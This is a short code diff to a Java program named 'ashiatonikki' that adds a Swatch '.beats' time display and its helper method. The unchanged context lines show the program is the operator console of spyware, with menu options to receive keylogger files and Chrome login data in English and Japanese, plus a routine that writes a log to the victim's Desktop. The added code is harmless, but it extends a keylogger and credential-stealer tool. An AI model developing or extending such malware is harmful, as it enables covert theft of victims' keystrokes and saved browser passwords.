@@ -38,6 +38,7 @@ public class ashiatonikki
 		  int minutes = cal.get(Calendar.MINUTE);
 		  if (language == 1) {
 		  System.out.println("The current date is " + dab + "-" + hours + ":" + minutes);
+		  System.out.println(".beats: +" + getCurrentTimeInBeats());
 		  System.out.println("Please input your command.");
 		  System.out.println("[1] Receive Keylogger Files");
 		  System.out.println("[2] Receive Chrome Login Data (Encrypted)");
@@ -46,6 +47,7 @@ public class ashiatonikki
 		  System.out.println("[6] 日本語");
 		  } else if (language == 3) {
 			  System.out.println("現在の日付は " + dab + "-" + hours + ":" + minutes);
+			  System.out.println(".beats: +" + getCurrentTimeInBeats());
 			  System.out.println("あなたのコマンドを入力してください。");
 			  System.out.println("[1] キーボード履歴を受け取る");
 			  System.out.println("[2] ログインデータを受け取る");
@@ -105,6 +107,11 @@ public class ashiatonikki
 	  }
   }
   }
+  public static int getCurrentTimeInBeats() {
+	    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
+	    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
+	    return beats;
+	}
   public static void record(String x) {
 		try {
 			File log = new File("C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt");
